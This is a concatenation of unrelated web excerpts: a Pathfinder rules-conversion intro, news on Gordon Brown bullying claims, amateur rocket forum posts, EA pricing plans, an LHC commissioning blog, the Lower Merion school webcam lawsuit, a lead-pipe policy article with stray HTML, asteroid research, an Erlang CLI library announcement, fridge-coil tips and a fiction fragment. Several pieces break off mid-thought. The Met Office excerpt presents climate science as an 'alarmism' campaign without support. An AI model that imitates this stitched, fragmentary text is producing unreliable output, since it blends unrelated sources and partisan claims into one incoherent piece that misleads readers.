This guide is intended to make converting your 3.5 game to the Pathfinder Roleplaying Game quick and easy .
It includes rules for converting characters , monsters , feats , spells , prestige classes , and magic items from the 3.5 version of the rules to the Pathfinder Roleplaying Game .
To use this conversion guide , you will need a copy of the Pathfinder Roleplaying Game Core Rulebook , as page numbers and tables referenced throughout this conversion guide refer directly to that book .
While the Pathfinder Roleplaying Game Bestiary ( due out in September , 2009 ) is useful in converting monsters , the guidelines in this document will suffice until its release .
The first half of this document addresses how to convert characters , covering everything from ability scores to experience points .
This step - by - step process is primarily for adjustments to player characters , but a quick version is presented later for making changes to minor NPCs and villains .
The second half of this document deals with converting existing mechanics , including prestige classes , feats , spells , and magic items .
While this guide tackles a wide variety of issues , Game Masters should expect to adjudicate a number of minor issues that fall outside this scope .

Tony Stark -
A talk show host should be a smooth operator , able to get a joke out of the stiffest actor and humoring the craziest of guest stars , letting the audience laugh along with them .
It 's hard to think of anybody better equipped for this then Tony Stark .
The whole show could just be an infomercial for Stark Industries , canceling out the need for commercials , which means the show would most consist of supermodels firing disintegrator rays and launching missiles .
It 'd beat the hell out of " Jaywalking " .

Several people in Gordon Brown 's office have contacted an anti-bullying charity , its boss has told the BBC .
Christine Pratt said " three or four " calls had been made to the National Bullying Helpline in recent years .
Earlier Lord Mandelson denied claims
Mr Brown had been warned about his temper , saying he " does n't bully people " .
Downing Street said it had not been contacted by the helpline , and had " rigorous " , well established procedures in place for staff to address concerns .
It follows a separate story in the Observer alleging that the head of the civil service Sir Gus O'Donnell was so concerned he had a word with Gordon Brown about his behaviour towards staff .
' Without foundation '
A book by the newspaper 's chief political commentator Andrew Rawnsley includes details of incidents where it is alleged Mr Brown grabbed staff by the lapels , shoved them aside and shouted at them .
Downing Street says the reports are " malicious allegations " that are " without foundation " .
The Cabinet Office said : " It is categorically not the case that the cabinet secretary asked for an investigation of the prime minister 's treatment of Number 10 staff . "
Please turn on JavaScript .
Media requires JavaScript to play .
But Mr Rawnsley said he had claimed only that Sir Gus had made " his own investigations " and had given the PM a verbal warning .
He told the BBC his source for the story was " 24 carat " .
Business Secretary Lord Mandelson , one of Mr Brown 's close allies , told BBC One 's Andrew Marr
Show the story painted a picture of man who " gets angry but chiefly with himself , who does n't bully people " .
He added that Mr Brown " does not like taking no for an answer " and there was " a degree of impatience " about him , but added : " I do n't think he so much bullies people as he is very demanding of people . "
' Wrong message ' But Ms Pratt , chief executive of the National Bullying Helpline , said that was sending out " the wrong message " to other chief executives or bosses who are accused of bullying : " Outright denial is just non-credible in today 's age " .
She told the BBC : " Over recent months we have had several inquiries from staff within Gordon Brown 's office .
" Some have downloaded information ; some have actually called our helpline directly and I have spoken to staff in his office . "
I think the country wants someone that will push things forward , and not allow things to be stagnant and stale
Gordon Brown
She said " over the last three or four years " the helpline had " probably received three or four calls " .
She added she would expect any employer in this situation not to " go into denial , but to look into it , to follow due process " .
Outright denial could " compound the stress of those who believe they are being bullied " , she said .
" We are not suggesting that Gordon Brown is a bully , what we are saying is staff in his office working directly with him have issues , and have concerns , and have contacted our helpline . "
Ms Pratt said she contacted the BBC because she was angered by government denials .
' Non-political ' BBC political correspondent Norman Smith said it was understood one of the individuals involved had to take time off because of stress .
Tory MP
Ann Widdecombe , who is a patron of the helpline , said it would be " quite a good idea " for Sir Gus to take " an informal look " at workplace conditions at Number 10 .
But she also criticised Ms Pratt 's decision to go public , saying the helpline was supposed to be confidential .
NICK ROBINSON'S NEWSLOG
The woman who told the BBC her National Bullying Helpline was called by three people who worked with the prime minister is now at the centre of a political storm
Read Nick 's thoughts in full Ms Pratt said the organisation would never comment on the merit of a case , and added that it was non-political .
Mr Brown was also supported on Sunday by cabinet colleagues Harriet Harman and Alan Johnson , who said Mr Rawnsley had a book to sell .
Mr Johnson said in 17 years he had " never " heard Mr Brown raise his voice .
On Saturday the prime minister told Channel 4 News things were sometimes said " in the heat of the moment " and when he was angry he might " throw the newspapers on the floor or something like that " .
But he went on : " Of course you do get angry , mostly with yourself .
But I 'm very strong - willed , I 'm very determined .
" I think the country wants someone that will push things forward , and not allow things to be stagnant and stale , and every morning I get up with a determination to do my best for this country . "
A Downing Street spokesperson said : " At no time has the National Bullying Helpline contacted Number 10 about these allegations .
" We have rigorous , well established procedures in place to allow any member of staff to address any concerns over inappropriate treatment or behaviour .
" The civil service will continue to have a no tolerance policy on bullying . "

166 21 0 Ok , I can help Rizwan depending on what he feels .
I can try to get some preferred OHKLA renders for these slides too .
For the time being , I will keep the diameter at 200 mm and use the oxidizer tank that was too short .
I can send you a PM with the dropbox account information .

The 200 mm diameter render with the too small tank will do just fine , it is close enough to what our final design will be that it conveys the right intuition about size etc .
It also look really good .
Thanks for the PM !
I 'll post here again once I have my slides in the drop box .

There are no pictures in there currently , the plan is that eventually each page introducing one of the hardware modules will also have a rendering of that module , and then at the end there will be a rendering of the entire stack .
Anybody can feel free to make any changes or comments while I am waiting on the graphics .

Here are two versions .
The first one obviously is n't structurally sound , it would need some trussing to make it rigid .
Instead of attaching the lander to the CM 's nose I attached it to the top ring of the propulsion module so that launch forces are not transferred through the CM structure .
The second one is based off of the old CLLARE concept .
All I did was replace the old lander with the new one .

brmj Rochester , New York , United States Member posts 379 26 0 Good work .
A few issues : I thought we were planning on a single tank for the PM now , rather than a cluster of four .
Also , I 'm pretty sure we were looking at making the OSM a frustum of a cone attached to the back of the CM and continuing its shape , rather than the old cluster of tanks design .
This is definitely a step in the right direction , though .

Good to know the stickers got to you in time !
As for the renders , I second both of brmj 's comments .
The PM is described in the overview document as consisting of a single tank with an interior separating bulkhead , since this minimises the empty tank mass .
The OSM is a truncated cone in shape , since it has to contain not just a few consumables tanks , but also retrorockets for deorbit and some RCS thrusters .
I understand you 're pressed for time .
If you do n't have time to attend to these things , it is n't a huge problem , we can use the renders you have provided here ( the top one , I think ) .
If you do get a chance to address either of these issues , though , it would be fantastic .
Also , to the extent that it is possible given however you have set the models up in SketchUp , renders of each component ( CM , OSM , PM , LL ) just by itself would be great , but if you can't then again that is fine .

I agree that an official template would be a great idea – I actually mentioned this in IRC the other night .
Right now there is no such thing , but if you are starting from scratch you could copy the opening frame of my presentation ( it 's in the DropBox ) so they at least match on that front .

It looks great .
It still needs just a little work , though .
Most importantly , it needs the duplicate slides so that it fits in the ignite format .
Some less important ones : on slide 4 , it should either be " from all trades " or " from all walks of life " .
On slide 8 , if the new renders get done in time , it would be great if you could swap the image out for one of them .
On slide 9 , It should be noted that CSXT does n't appear to be a company and I do n't think Masten Space Systems has done space missions yet , just VTOL rocket testing .
Also , we may want to include Orbital Sciences Corporation in the list .
They do a lot of government work , but the Pegesus was essentially their own , private project , if I remember correctly .
On the tenth slide , " flushing out " should be " fleshing out " / p>

69 38 0 It has been mentioned somewhere , forgot where , is that it may be possible to get additional ( maybe substantial ) funding from the government or non-government foundations .
Maybe Obama 's new space plan has some funds that we can tap ?
Does Europe have a programme that we can apply for ?
Also , there are LOTS of aerospace foundations with substantial money behind them where we could apply for grants .
Just to name a few programmes and organizations found on the first page of a google search : http://www.earthandspace.org/

I am a bit pressed for time , but I am getting the bulk of it ready .
I 'm trying to keep it consistent with the other presentations too .
One thing I have noticed is that with the CLLARE presentation , we are using a motto that says “ Space exploration , by anybody , for everybody ” , but the website and the presentation Rizwan worked on says , " “ Space exploration , by anyone , for everyone ” .

Electronic
Arts plans to grow its digital game business to become one - third of their total revenue over the next few years and that includes starting to charge for what one analyst described as very long game demos .
Advertisement
The comments came during an analyst visit to Electronic Arts ' Redwood City headquarters and meetings with the company 's executives .
One of Electronic
Arts strategies will be to release what they call " premium downloadable content " on the Playstation Network and Xbox Live for $ 10 to $ 15 and then later release the full game for a full price , EA Group General Manager Nick Earl told Wedbush analyst Michael Pachter during the recent meeting .
Advertisement
Pachter writes in his report of the meeting that this premium downloadable content would " essentially be a very long game demo , along the lines of 2009's Battlefield 1943 . "
The " full - blown packaged game " would released shortly after the download version , he writes .
Earl told Pachter that the strategy would allow the company to limit the risk of marketing the full game and would " serve as a low - cost marketing tool . "

A marketing tool that it sounds like you 'll be paying $ 10 to $ 15 for .
We 've contacted Electronic Arts for comment and clarification , but have not yet heard back .
We 'll update this story when and if we do .
During the same meeting at EA , John Riccitiello , the company 's CEO , told Pachter that the " company had performed poorly over the first years of his tenure , and admitted that the turnaround of the company was taking longer than he originally expected . "
Advertisement
Riccitiello estimated that Electronic
Arts was about two - thirds of the way through its turnaround , and one - third of the way through its " transformation to the distribution of intellectual property through multiple channels . "
He added that he expects the company to grow its digital business to one - third of EA 's revenues within the next few years .

Another major way that EA plans to achieve that goal , Riccitiello told Pachter , is for EA to " exploit all of its packaged games with ancillary digital revenue streams . "
At this very moment the LHC is busy trying to set a new world record .
The goal is to achieve beams circulating at 3.5 TeV , bringing collisions between protons to 3.5+3.5=7 TeV center - of - mass energy .
This would be the highest particle energy ever accomplished by humans ( nature somehow routinely manages to produce cosmic rays at energies 8 orders of magnitude higher ! ) .
This news is hot off the press : we had a talk today by Lyn Evans , and he gave us the latest update .
He should know what 's going on , since he 's project leader of the LHC .
Evans shared some entertaining anecdotes from the last few years of commissioning , including :
They use superfluid helium to cool the superconducting magnets .
One of the many weird properties of this stuff is that it has zero viscosity .
Which means that , if there 's any sort of hairline fracture anywhere in the 27 kilometer long tunnel , the stuff comes spewing out , and very , very bad things happen .
Every component , every joint , every one of the tens of thousands of tiny connections has to be perfect .
It is this sort of failure which brought the machine to its knees shortly after commissioning , over a year ago .
The magnets are kept very , very cold ; the superfluid helium is at 1.9 Kelvin ( - 271 Celsius ) , or a couple of degrees above absolute zero .
We 're not talking a little vial in a laboratory being kept at this temperature .
We 're talking many thousands of tonnes of magnets , kept just above absolute zero ( using 96 tonnes of liquid helium ) .
As things cool down , they naturally contract .
The decks on bridges do the same thing , hence those serrated grills at the ends of bridges to absorb the expansion and contraction due to weather ( if you 've ever motorcycled across a bridge , you know exactly what I 'm talking about ) .
There are equivalent serrated joints in the LHC beam pipe to ensure that it does n't contract and rip open upon cooling ( which , needless to say , would be bad ) .
But upon reheating a section of the LHC , it turned out some of these devices left little fibers in the beam tube .
Not good .
How to find them , without ripping open the entire collider ( costing millions of dollars and setting the project back precious months ) ?
They ended up blowing a ping pong ball ( with electronics embedded ) down the tube , and tracking where it would get stuck .
A simple , elegant , cheap solution to fix a multi-billion dollar enterprise .
For a while during the construction they ended up with roughly a billion dollars worth of superconducting magnets being stored in a parking lot at CERN .
For reference , this is comparable to the entire GDP of many small countries ( Bhutan , Guyana , Burundi , etc. ) , sitting out in the rain and snow .
Big science .
Hopefully sometime in the next few days they 'll be running at 3.5 TeV .
Apparently it 's been slow going because the system to prevent catastrophic quenching of the magnets ( which is what " broke " the machine previously ) is on a hair - trigger , setting off all sorts of false alarms ( and when it goes off it quenches the magnets [ in a controlled manner ] ) .
You can keep track of the progress on the LHC webpage ( clicking on the image of the ring gives real - time data on the temperature of the magnets ) .
Although this would be the highest energy ever achieved , it still does n't significantly surpass the science reach of Fermilab 's Tevatron , since the latter has run for many years ( albeit at a lower energy of 1 TeV+ 1TeV ) .
Both energy and ( integrated ) luminosity matter in this game , and the Tevatron has gotten more than 8 inverse fb ( femtobarns ; one of the best units in all of science [ think " there 's no way to miss it , it 's as big as a barn " ] ) .
The LHC is shooting for 1 inverse fb .
All being well , in a few months they 'll bump the energy up to 5 Tev on 5 TeV .
This should significantly open up the scientific discovery space , and could conceivably kick off the next revolution in particle physics .
Exciting times !
The webcams that officials could turn on remotely without students ’ knowledge at a wealthy suburban Philadelphia school district have been turned off , the superintendent has said .
The announcement came hours after disclosure Thursday of a lawsuit filed by parents of the Lower Merion School District student that claimed the laptops handed out by the district were used to snoop on teenagers at home .
Some students , angry at news of the alleged spying , have taped over the laptop cameras and microphones .
Grade 10 student Tom Halperin described students as “ pretty disgusted ” and pointed out his class recently read 1984 , the George Orwell classic that coined the term “ Big Brother . ”
“ This is just bogus , ” Halperin , 15 , told The Associated Press as he left Harriton High School with his taped - up computer .
“ I just think it ’s really despicable that they have the ability to just watch me all the time . ”
The webcams would not be used again unless there were “ express written notification to all students and family , ” superintendent Dr. Christopher McGinley said in a statement .
The cameras , which the lawsuit said were remotely activated without students ’ or parents ’ knowledge , came with the Apple computers the school district gave all of its 1,800 students .
If a laptop vanished , the webcam was switched on remotely by the school district ’s security and technology staff .
“ This feature has only been used for the limited purpose of locating a lost , stolen or missing laptop , ” said McGinley .
Students only found out the webcams could be turned on remotely when a principal told a student they had a picture of him doing something wrong in his home , the lawsuit said .
“ The school district has the ability to intercept images from that webcam of anyone or anything appearing in front of the camera at the time of activation , ” the lawsuit claims .
“ The school district has the ability to remotely activate the embedded webcam at any time .
“ Many of the images captured may consist of minors and their parents or friends in compromising or embarrassing positions , including various stages of undress . ”
It was only when an assistant principal at Harriton High School told Grade 10 student Blake Robbins she had a picture that proved he “ was engaged in improper behaviour in his home ” that anyone realized the school could peep into students ’ home lives without them knowing , the lawsuit says .
Assistant principal Lindy Matsko “ cited as evidence a photograph from the webcam embedded in ” Robbins ’ school - issued laptop , the lawsuit says .
Blake ’s parents , Michael and Holly Robbins , filed the lawsuit Feb. 11 on behalf of all 1,800 students at Lower Merion ’s schools .
The lawsuit alleges the webcams violate the U.S. Constitution ’s guarantees of privacy , Pennsylvania common law , the U.S. Civil Rights Act , and a variety of other laws .
In his welcome to students , posted on the district website , McGinley speaks glowingly of the program to give every student their own laptop and create “ an authentic , mobile , 21st century learning environment . ”
The program “ ensures that all students have 24/7 access to school - based resources . ”

The Robbins lawsuit contends the district also had 24/7 access to the students “ by the unauthorized , inappropriate and indiscriminate remote activation of a webcam . ”
Serving the wealthy Main Line outside of Philadelphia , the Lower Merion School District “ is one of only two districts in Pennsylvania to earn Moody ’s highest bond rating , ” information in McGinley ’s biography says .
Its teachers are among the highest paid in Pennsylvania and its students ’ college - entrance scores are among the highest in the country , the information says .
An article ran in the Politico yesterday which I thought rather credulously repeated Senate Republicans ’ claims about how much success they think they ’ll have scuttling the Health Care fix bill as it moves through the reconciliation process .
( See our earlier piece on the Senate GOP ’s psyops strategy to kill Health Care Reform in the House . )
But there ’s a part of this drama that ’s gotten far too little attention .
Most of what senate Republicans say they ’re going to try to do is fight like crazy to keep the least popular parts of the original Senate package in the bill .
That ’s right .
They ’re going to go to the mat for the ‘ Cornhusker Kickback . ’
They ’re going to do everything they can to prevent the “ Cornhusker Kickback ” from being overturned .
Same with the “ Louisiana Purchase ” , the tax on “ Cadillac ” Health Care plans and a bunch of other stuff .
As we know , what happens in reality does n’t matter in politics .
What matters is how reality is portrayed in 30 second attack ads .
But I think , on both sides of the political spectrum , the implications of this effort have n’t been adequately thought through .
So much of the what the GOP is trying to do now is about one big galactic psych - out .
And the psych - out pyrotechnics are so overblown in part because the threats sort of fall apart on their face .
If you step back a lot of it amounts to , “ Do n’t you dare pass that bill , or I ’ll shoot my foot right off ! ”
Some dares really are worth taking .
What is not generally realised is that the UK Met Office has been , since 1990 , at the very centre of the campaign to convince the world that it faces catastrophe through global warming .
( Its website now proclaims it to be " the Met Office for Weather and Climate Change " . )
Its then - director , Dr John Houghton , was the single most influential figure in setting up the UN's Intergovernmental Panel on Climate Change ( IPCC ) as the chief driver of climate alarmism .
Its Hadley Centre for Climate Change , along with the East Anglia Climatic Research Unit ( CRU ) , was put in charge of the most prestigious of the four official global temperature records .
In line with IPCC theory , its computers were programmed to predict that , as CO2 levels rose , temperatures would inevitably follow .
From 1990 to 2007 , the Department of the Environment gave the Met Office no less than £ 146 million for its " climate predictions programme " .

At treatment plants , lead levels often are acceptable – but then they rise as water flows through service lines .
Acidic water can corrode lead pipes and carry lead that leaches from them to the tap .
Utilities can’t fully control the problem because property owners usually own the pipes that connect homes to the water mains .
</p><p>Until the 1950s , lead pipes to houses were common .
By 1986 they were banned , but old lead pipes remain – and are corroding – across the country , especially in the Northeast , Midwest and older urban areas .
</p><p>Nearly < a href= " https://www.awwa.org/Portals/0/files/membership/member%20recruitment/AWWA%20in%%2020Action.pdf ">one-third of water systems </a> in the U.S. report that at least some of their service lines contain lead .
The exact number of lead service lines is estimated at < a href = " https://www.awwa.org/Portals/0/files/membership/member%20recruitment/AWWA%20in%%2020Action.pdf " >7 to 11 million </a> - more than 50,000 miles of lead pipes .
This would mean that service lines to the homes of about 15 to 22 million people , or 7 % of those served by a community water system , could contain lead .
</p><p>More than one in five utilities < a href= " https://www.eenews.net/stories/1060039790 " > do not know < /a> whether lead service lines exist for the homes they serve .
Addressing this problem will require the federal government to update regulations , while states improve monitoring and enforcement .
The EPA does not require lead testing in schools , and sampling procedures at community water systems can be inconsistent .
</p><p>Lead is one of the few water contaminants that utilities are required to measure at a customer ’s home , and utilities do not always follow EPA sampling procedures in practice .
A violation is incurred only if 10 % or more of samples have concentrations above the action level for lead , which is 15 parts per billion .
Some utilities take many more samples than required and < a href = " https://www.theguardian.com/environment/2016/jun/02/lead-water-testing-cheats-chicago-boston-philadelphia " >discard those with high lead levels </a > , a 2016 investigation found .
</p><p>Another hurdle is reduced funding for enforcement activities .
State funding < a href= " https://www.asdwa.org/wp-content/uploads/2017/03/SRNAP-Analysis.pdf " >declined by 26 % </a > from 2001 to 2011 , while workloads have increased due to new rules .

><p></p><h2>Controlling corrosion and replacing pipes </h2 >< p> Water system managers must inform the public when they find elevated lead levels .
They may need to reduce pipe corrosion or replace service lines made of lead .
</p><p>Water treatments to adjust pH and lessen corrosion can be effective in reducing exposure to lead .
They are required in cities of more than 50,000 and in smaller systems with violations .
Flint ’s system lacked proper corrosion control , which would have cost only about < a href = " https://www.npr.org/sections/health-shots/2018/06/25/623126968/pediatrician-who-exposed-flint-water-crisis-shares-her-story-of-resistance ">US$ 100 per day </a>.</p>< p>Replacing lead pipes nationwide , which would permanently solve the corrosion problem , would cost < a href = " https://www.epa.gov/sites/production/files/2016-10/documents/508_lcr_revisions_white_paper_final_10.26.16.pdf " >$ 16 billion to $ 80 billion < /a>.
Utilities that cannot reduce lead levels through corrosion control are legally required to replace pipes at a rate of 7 % yearly .
However , they only have to pay for replacing pipes they own .
Many homeowners decline to pay for their portion , which can cost between $ 1,000 and $ 12,000 .
</p>< p>Partial replacements can worsen conditions by disrupting pipelines and dislodging lead .
Nonetheless , some cities have launched replacement programs .
Others , including Detroit , Denver and Newark , have taken steps to identify and inventory lead pipes in their service areas .
</p><h2>Stricter rules</h2 >< p> Revised federal and state guidelines could limit oversampling by utilities and improve water testing in people ’s houses .
New regulations could prohibit the practice of “ < a href = " https://www.theguardian.com/environment/2016/jun/02/lead-water-testing-cheats-chicago-boston-philadelphia ">pre-flushing</a> , ” or running water for several minutes before drawing a sample , which some engineers use to < a href = " https://www.michiganradio.org/post/states-instructions-sampling-drinking-water-lead-not-best-practice ">clear lead from pipes </ a> prior to testing .
Another strategy would be for regional EPA offices to conduct random sampling of tap water quality .
</ p>< p>The EPA currently is considering < a href = " https://www.epa.gov/dwstandardsregulations/lead-and-copper-rule-long-term-revisions ">long-term revisions </a > to the Lead and Copper Rule .
In our view , an updated rule should require corrosion control , identification and replacement of lead lines , specific sampling procedures and better public education .
</p><p>We believe that lead contamination can be eliminated through better enforcement , more funding for state agencies , stricter sampling and proactive efforts to control corrosion .
These actions will pay off by improving children ’s health nationwide .

Astronomers have worried about the impact that asteroids could have on Earth ever since a theory was proposed in the 1980s that a giant asteroid likely caused the extinction of the dinosaurs 65 million years ago .
New research by MIT Professor of Planetary Science Richard Binzel examines the opposite scenario : that Earth has considerable influence on asteroids — and from a distance much larger than previously thought .
By analyzing telescopic measurements of near - Earth asteroids ( NEAs ) , or asteroids that come within 30 million miles of Earth , Binzel has determined that if an NEA travels within a certain range of Earth , roughly one - quarter of the distance between Earth and the moon , it can experience a “ seismic shake ” strong enough to bring fresh material called “ regolith ” to its surface .
These rarely seen “ fresh asteroids ” have long interested astronomers because their spectral fingerprints , or how they reflect different wavelengths of light , match 80 percent of all meteorites that fall to Earth , according to a paper by Binzel appearing in the Jan. 21 issue of Nature .
The paper suggests that Earth ’s gravitational pull and tidal forces create these seismic tremors .
By hypothesizing about the cause of the fresh surfaces of some NEAs , Binzel and his colleagues have tried to solve a decades - old conundrum about why these fresh asteroids , known as Q - types , are not seen in the main asteroid belt , which is between Mars and Jupiter .
They believe this is because the fresh surfaces are the result of a close encounter with Earth , which obviously would n’t be the case with an object in the main asteroid belt .
Only those few objects that have ventured recently inside the moon ’s orbital distance , about one - quarter of the distance between Earth and the moon , and have experienced a “ fresh shake ” match freshly fallen meteorites measured in the laboratory , Binzel says .
Clark Chapman , a planetary scientist at the Southwest Research Institute in Colorado , believes Binzel ’s work is part of a “ revolution in asteroid science ” over the past five years that considers the possibility that something other than collisions can affect asteroid surfaces .
“ For decades , it was thought that the sizes , shapes and spin period of asteroids were all caused by collisions between asteroids , and that this could explain everything that has happened to them in the past 4 billion years , ” he says .
“ This work is one more perspective in this revolution of thinking about these very weird rubble piles , and what ’s affecting them . ”
The ordinary chondrite problem
Although it is believed that meteorites come from asteroids , astronomers and meteorite scientists have struggled for 30 years to figure out why asteroids matching the majority of all meteorites that fall to the Earth , known as ordinary chondrites , could not be found in space .
The discrepancy emerged when scientists began measuring the spectral fingerprints of meteorites in the lab to determine their mineral constituents based on how they reflect light of different wavelengths .
Around the same time , astronomers began using telescopes to measure how asteroids reflect light of varying wavelengths .
Because meteorites are thought to originate from asteroids , it was expected that the spectral fingerprints would match .
Instead , scientists found asteroids with spectral fingerprints that were muted and had a reddish tint .
These asteroids , known as S - types , appear “ sunburned , ” according to Binzel , due to the space weathering process of solar wind that physically damages their mineral structure .
It was n’t until last year that astronomers could estimate the exposure time of the space weathering process when co-author Pierre Vernazza determined that it takes solar wind a million years to redden an asteroid .
“ In astronomy , this is nothing , it ’s like yesterday , ” Binzel explains .
Vernazza ’s findings , he notes , suggested that astronomers should never see fresh asteroids , since the weathering process is so “ brief . ”
And yet they ’ve been observing Q - types among NEAs for 25 years — suggesting there is something about their proximity to Earth that freshens their surface at a rate that is faster than the space weathering process .
That something , Binzel believes , is the seismic shake - up caused by Earth ’s tidal stress and gravitational pull .
Making the connection
For a decade , Binzel ’s team has used a large NASA telescope in Hawaii to collect information on NEAs , including a huge amount of spectral fingerprint data .
Using this data , as well as estimates based on numerical calculations , Binzel ’s team examined where a sample of 95 NEAs had been during the past 500,000 years , tracing their orbits to see how close they ’d come to Earth .
They discovered that 75 NEAs in the sample had passed well inside the moon ’s distance within the past 500,000 years , including all 20 Q - types in the sample .
Using a calculation known as Minimum Orbit Intersection Distance ( MOID ) , Binzel next determined that an asteroid traveling within a distance equal to 16 times the Earth ’s radius ( about one - quarter of the distance to the moon ) appears to experience vibrations strong enough to create fresh surface material .
He reached that figure based on his finding that one - quarter of NEAs are fresh , as well as two known facts — that space weathering can happen in less than one million years , and that about one - quarter of all NEAs come within 16 Earth radii in one million years .
Before now , people thought an asteroid had to come within one to two Earth radii , a distance known as the Roche limit , to undergo significant physical change .
Shaking up asteroid seismology
Many details about the shaking process remain unknown , including what exactly it is about Earth that shakes the asteroids , and why this happens from a distance as far away as 16 Earth radii .
What is certain is that the conditions depend on complex factors such as the velocity and duration of the encounter ; the asteroid ’s shape , internal structure , surface gravity and rotation rate ; and the nature of the preexisting regolith .
“ The exact trigger distance depends on all those seismology factors that are the totally new and interesting area for cutting edge research , ” Binzel says .
Further research might include computer simulations , ground observations and sending probes to look at the surfaces of asteroids .
“ We do n’t know yet what more than a handful of these objects look like , ” Chapman says of the Q - types .
He predicts theoreticians will put together models about the behavior of these asteroids to help scientists better understand Binzel ’s research .
Binzel ’s next steps will be to try to discover counterexamples to his findings or additional examples to support it .
He may also investigate whether other planets like Venus or Mars affect asteroids that venture close to them .
His research will be tested in 2029 when the asteroid Apophis is expected to travel within a distance equal to six times the Earth ’s radius .
Anyone with binoculars in Europe or Africa will be able to conduct a simple test to see whether the close encounter makes the surface of the weathered asteroid appear less red .
“ It should certainly be changed in this fashion if the Binzel observation is interpreted correctly , ” Chapman says .
South Australia 's Attorney - General has defended tougher laws on political comment made on the internet .
During election periods , anyone posting comment or blogs must publish their real name and postcode .
Michael Atkinson says it has long been a requirement that newspapers verify personal details for letters published during election periods .
He says the new law , which has applied since early last month , ensures the public 's right to know .
" [ It 's really about ] the right to know who 's making a comment during an election period , " he said .
" It will only apply to newspapers and extensions of newspapers .
" All it is ... is a re-formulation of the very old rule which has applied throughout our lifetimes that if in the election period , and only in the election period , if you write a letter to the paper calculated to affect the result of the election then you have to do so under a real name and a real address . "
Mr Atkinson says television and radio has always been regulated by the Commonwealth and it is most likely that comment on websites such as the ABC 's would fall into that category .
' Avoid any criticism '
The editor of The Advertiser newspaper Melvin Mansell is outraged by the Attorney - General 's move .
" What the Attorney - General is trying to achieve here is to avoid any criticism whatsoever of government policy , " he said .
" The clear implication is that if you show enough dissent he 's going to take action against you . "
There is concern that the Government 's powers may extend to political comment made on social networking sites such as Facebook and Twitter .
A coalition of major newspapers has branded the new law as draconian censorship of public comment .
SA is about to enter a formal campaign period ahead of its state poll on March 20 .
Announcing ErlCtl , 0.1
// February 21st , 2010 // Uncategorized
There has always been a need to have a good command - line interface to most system software .
While Erlang is great for writing this kind of stuff , it 's natural command - line can be less than stellar .
If we were left to use the erl command itself , command - lines would be long to type and arduous to construct .
Most projects avoid this problem with the standard Apache idiom of having a control script .
As it so happens , Erlang is a lovely language for this idiom .
Rather than lots of trouble managing processes and working with sockets , Distributed Erlang neatly solves these issues of simple security , finding running programs , and generally making it easy for two Erlang programs to interact .
While the major Erlang projects have their own implementations of this ( ejabberdctl , rabbitmqctl , riak - admin ) , there is n't really anything built - in to fill this need .
After a little frustration trying to adapt other code to fit the bill , I just wrote my own for use with my latest super - sekret project .
After a little cleanup , here 's a generic library for building simple command - line interfaces and an example application that uses it !
World , meet ErlCtl .
It 's young , so , please , be gentle .
How Do I Use It ?
How might you use this software , you ask ?
Well , it 's really quite simple .
After installing erlctl - 0.1 into your Erlang lib_dir ( not automated yet ) , follow these two easy steps .
First , somewhere in your command path , make a symlink from the erlctl binary ( in erlctl - 0.1 / bin ) to the name of your control program .
For this example , let 's say you have an application named awesome .
In this case , you 'd link the program to awesomectl ( or , alternately awesome_ctl ) .
Second , in your application , create a module based on the same name .
In this case , you would create awesome_cli.erl .
This module should export functions ( which I call " commands " ) that take two arguments .
The first argument is the " context " within which that command runs , and the second is the list of arguments for that function .
Commands For Any Season
For example , let 's say you have a command that should print out the version of your application .
If you define that " version " command with the " always " context , then it will simply run your code .
For example :
version ( always , [ ] ) -> { ok , " Version : ~p " , [ 0 . 1 ]} .
This simple function will return a successful return code and print out the version number .
Presto , instant CLI !
You can run this a command line like " awesomectl version " .
It 's that easy !
Starting Things Up
Let 's say that you need to start a server process .
If you provide a command in the " not_running " context , it can start a server as easily as it can return the atom " start " .
start ( not_running , [ ] ) -> { start , [ ] , " Starting . " } ;
It does n't have to stop there .
Need to run some code after starting the server ?
Create the same command with the " started " context , and it will be run in the started server .
start ( started , [ ] ) ->
ok = application : start ( ctl_ex ) ,
{ ok , " Started ! " } .
Notice that the first command decided to start a new server , the server started , and the second command took over inside of the newly started server ?
Neat , huh !
You would run this with the simple command line of " awesomectl start " .
It 's Like An " Erlang Endoscope " ™
Let 's say your server is happily running along , but you need to monkey about with its internals .
The " running " context will cause the command to happily run inside of the server with no messy work required !
list_users ( running , [ ] ) ->
{ ok , Users } = ctl_ex : list_users ( ) ,
format ( " Users : ~n " ) ,
case Users of
[ ] ->
io : format ( " < no users > ~n " ) ;
_ ->
lists : foreach (
fun ( User ) ->
format ( " ~ s~n " , [ User ] )
end ,
Users
)
end ,
ok .
Notice how there are a few useful commands to help out ?
The format command transparently handles printing out stuff at the client side , without worrying about where your code is actually running .
That 's location - transparency that saves you time !
As you might have imagined , the command here is " awesomectl list_users " .
What 's even better is that commands may implement any combination of these contexts as they see fit .
So you can give intelligent errors when a server is n't running , or implement actual functionality when it is !
A Fully ARMED and OPERATIONAL Example Application
Is this a bit too much to take in at once ?
Why not take a look at the example application I wrote for you .
It 's a simple application , with a simple gen_server that keeps track of a list of users .
A full CLI is provided for it in this single file .
The purpose of refrigerator coils is to dissipate heat , not suck up electricity — or cash — out of your wallet .
But that 's what happens if you do n't clean off those bad boys once in a while .
Here 's how .

Some fridge coils are located underneath the appliance , others are on the back of it , but they all need a good scrubbing at least once a year .
When they 're gunked up with pet hair , cooking grease , and other flotsam , they wo n't operate efficiently .
At best , your refrigerator will use extra electricity as it runs more often to keep things cool .
At worst , it will run so often that your compressor burns out — a big expense that will leave a significant dent in your wallet .

Cleaning your fridge coils is n't as much of a pain as it sounds , and the folks at home improvement web site Home Envy walk you through it .
The first step , of course , is unplug the fridge so you do n't zap yourself .
Depending on where the coils are , you may need to move the appliance away from the wall .
Putting the fridge on rollers makes the job a lot less irritating , although the act of putting the rollers under the fridge takes two people and is VERY irritating , especially if the fridge comes down hard and busts one of the rollers because the person holding it had sweaty hands .
If you have to move the fridge out from the wall and you do n't have rollers , put some cardboard or a heavy drop - cloth down to protect the floor or the fridge may mar it .

Once you can reach the coils without assuming an uncomfortable yoga position , grab your vacuum , a bucket of warm , soapy water , and get to work .
Admittedly , cleaning your fridge coils is n't a fun job , but it 's only once a year so it 's not that big of a deal .
What once - a - year jobs around the house do you dread ?
How do you make it easier ?
Talk about it in the comments .

You were there !
They started replacing perfectly good kidneys just because they were ' shaped funny ' !
Weekly CAT scans !
Daily colonics !
Soon they were installing multiple , backup organs ' just in case ' !
Look at me : I used to be a normal sized man who always somehow inexplicably looked fat , now I 'm practically anorexic ! "
He motioned downward at his emaciated frame and I saw that , indeed , he was whip - thin now .
Still looked fat though .
Weird how that worked .
My theory is that he 's made of Stretch Armstrong material left out in the sun .

